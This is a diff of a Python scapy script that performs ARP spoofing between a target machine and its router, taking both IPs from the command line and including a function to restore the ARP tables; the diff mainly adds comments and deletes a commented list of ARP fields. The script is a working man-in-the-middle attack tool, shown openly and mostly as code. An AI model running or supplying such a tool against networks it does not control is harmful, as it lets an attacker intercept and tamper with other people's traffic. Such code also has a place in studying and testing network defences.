@@ -2,15 +2,18 @@ import sys
 from scapy.all import *
 from scapy.layers.l2 import ARP, Ether, getmacbyip
 
+# spoofing arp with sending arp reply packets
 def arp_spoof(dest_ip, dest_mac, source_ip):
     packet = ARP(op="who-has", psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
     send(packet, verbose=False)
 
-def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
+# restore arp table on the both machines 
+def arp_restore(dest_ip, dest_mac, source_ip, source_mac): # Optional beacuse victim and router automaticly will set up old variables
     packet = ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
     sendp(Ether(dst=dest_mac)/packet, verbose=False)
 
 def main():
+    # get args from terminal
     target_ip = sys.argv[1]
     router_ip = sys.argv[2]
 
@@ -36,13 +39,3 @@ def main():
         quit()
     
 main()
-
-# hwtype     : XShortEnumField                     = ('1')
-# ptype      : XShortEnumField                     = ('2048')
-# hwlen      : FieldLenField                       = ('None')
-# plen       : FieldLenField                       = ('None')
-# op         : ShortEnumField                      = ('1')
-# hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = ('None')
-# psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = ('None')
-# hwdst      : MultipleTypeField (MACField, StrFixedLenField) = ('None')
-# pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = ('None')
